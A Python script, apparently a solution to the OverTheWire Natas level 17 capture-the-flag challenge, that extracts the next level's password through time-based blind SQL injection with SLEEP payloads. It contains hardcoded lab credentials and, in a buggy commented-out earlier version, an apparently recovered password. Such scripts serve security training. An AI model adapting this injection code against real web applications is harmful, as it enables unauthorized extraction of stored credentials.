import requests
import string
from multiprocessing.pool import Pool, ThreadPool
from functools import partial

USERNAME = 'natas17'
PASSWORD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
AUTH = USERNAME, PASSWORD
URL = 'http://natas17.natas.labs.overthewire.org/index.php'

def time_query(query):
    sleep = 2
    payload = f'natas18" AND (password LIKE BINARY "{query}" AND SLEEP({sleep}));#'
    params = {'username': payload}
    response = requests.get(URL, params=params, auth=AUTH)
    return response.elapsed.total_seconds(), query

def filtered_indexed_query(pwrd_chars ,i):
    with Pool(processes=len(pwrd_chars)) as char_pool:
      for t, query in char_pool.imap_unordered(time_query, {f"{'_'*i}{char}%" for char in pwrd_chars}):
        if t > 1.5:
          char = query[-2]
          return char, i

def main():
  
  chars = string.ascii_letters + string.digits
  pwrd_chars = set()
  with ThreadPool(len(chars)) as pool:
    for t, query in pool.imap_unordered(time_query, {f"%{char}%" for char in chars}):
      if t > 1.5:
        char = query[-2]
        pwrd_chars.add(char)
  print(pwrd_chars)
  length = 32
  pwd = ['']*length
  indexed_query = partial(filtered_indexed_query, pwrd_chars)
  
  
  with ThreadPool(length) as index_pool:
    for char, i in index_pool.imap_unordered(indexed_query, range(length)):
      pwd[i] = char
      print(pwd)
  # for i in range(length):
  #   char, i = index_query(i)
  #   pwd[i] = char
  #   print(pwd)
  print("".join(pwd))



if __name__ == "__main__":
  main()
# import requests
# from multiprocessing.pool import ThreadPool
# import string



# def main():
#   username = 'natas17'
#   password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
#   authorization = (username, password)
#   url = "http://natas17.natas.labs.overthewire.org/"

#   pwrd = ""
#   def time_query(query):
#     nonlocal pwrd
#     payload = {"username": f'natas18" AND password LIKE BINARY "{password}{symbol}%" AND SLEEP(1) ;#'}
#     response = requests.post(url, auth=authorization, data=payload)
#     return response.elapsed.total_seconds(), query[-2]
  
#   length = 32
#   symbols = string.ascii_letters + string.digits
#   for i in range(length):
#     print(password)
#     with ThreadPool(len(symbols)) as pool:
#       for t, symbol in pool.imap_unordered(time_query, symbols):
#         if t > 1:
#           password += symbol
#           break
#   print(password)

# if __name__ == "__main__":
#   main()
#   # xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP